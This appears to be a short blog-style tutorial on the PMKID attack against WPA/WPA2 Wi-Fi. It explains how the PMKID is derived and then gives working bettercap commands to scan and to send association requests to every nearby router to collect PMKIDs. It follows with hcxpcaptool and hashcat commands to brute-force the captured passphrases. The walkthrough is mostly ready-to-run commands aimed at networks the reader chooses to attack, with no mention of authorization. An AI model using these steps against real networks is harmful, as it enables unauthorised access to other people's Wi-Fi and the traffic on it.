<br/>
It turns out that a lot of modern routers append an optional field at the end of the first EAPOL frame sent by the AP itself when someone is associating, the so called Robust Security Network, which includes something called PMKID.<br/>
<br/>
the PMKID is derived by using data which is known to us:<br/>
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)<br/>
<br/>
Since the “PMK Name” string is constant, we know both the BSSID of the AP and the station and the PMK is the same one obtained from a full 4-way handshake, this is all hashcat needs in order to crack the PSK and recover the passphrase!<br/>
<br/>
This can be done in bettercap or possibly other tools<br/>
<br/>
$ sudo bettercap -iface wlan0<br/>
&gt; wifi.recon on<br/>
&gt; set wifi.show.sort lcients desc<br/>
&gt; set ticker.commands 'clear; wifi.show'<br/>
&gt; ticker on<br/>
<br/>
Now you'll be able to see a bunch of SSIDs that are being broadcasted. <br/>
<br/>
Pick a channel of an SSID you want to attack:<br/>
&gt; wifi.recon.channel 1<br/>
<br/>
Send association request to every AP and see who'll respond with useful information:<br/>
&gt; wifi.assoc all<br/>
<br/>
All nearby vulnerable routers will start sending their PMKID, which bettercap will dump to the usual pcap file<br/>
<br/>
<br/>
<br/>
<b>PMKID Cracking</b><br/>
Convert the PMKID data to a hash format for hashcap with <a href="https://github.com/ZerBea/hcxtools">hcxpcaptool</a>:<br/>
hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap<br/>
<br/>
Now crack using hashcap 16800:<br/>
hashcat -m 16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'<br/>
<br/>
<br/>
<br/>
<b>Recap</b><br/>
&nbsp; &nbsp; Goodbye airmon, airodump, aireplay and whatnots: one tool to rule them all!<br/>
&nbsp; &nbsp; Goodbye Kali VMs on macOS: these modules work natively out of the box, with the default Apple hardware &lt;3<br/>
&nbsp; &nbsp; Full 4-way handshakes are for n00bs: just one association request and most routers will send us enough key material.<br/>
